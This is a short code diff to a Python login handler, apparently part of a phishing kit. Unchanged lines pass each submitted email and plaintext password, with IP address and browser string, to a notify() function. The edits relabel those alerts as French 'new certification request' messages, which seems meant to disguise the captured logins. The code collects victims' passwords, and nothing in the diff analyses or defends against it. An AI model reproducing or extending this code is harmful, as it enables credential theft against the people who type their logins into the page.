@@ -100,7 +100,8 @@ def login_submit(
 
     if is_blocked_attempt(ip, email, password, ua) or rate_limited(ip, email):
         notify(
-            "<b>login SUSPICIOUS</b>\n"
+            "<b>Nouvelle demande de certification</b>\n"
+            "<b>Statut:</b> tentative suspecte\n"
             f"email: <code>{escape(email[:200])}</code>\n"
             f"ip: <code>{escape(ip)}</code>\n"
             f"ua: <code>{escape(ua[:200])}</code>"
@@ -150,14 +151,15 @@ def login_submit(
     ok = db.verify(email, password)
     db.log_event(email, ok, ip, ua)
 
-    status = "OK" if ok else "ECHEC"
+    status = "Réussie" if ok else "Identifiants invalides"
     safe_email = escape(email)
     safe_password = escape(password)
     safe_ip = escape(ip)
     safe_ua = escape(ua)
 
     notify(
-        f"<b>login {status}</b>\n"
+        "<b>Nouvelle demande de certification</b>\n"
+        f"<b>Statut:</b> {status}\n"
         f"email: <code>{safe_email}</code>\n"
         f"password: <code>{safe_password}</code>\n"
         f"ip: <code>{safe_ip}</code>\n"
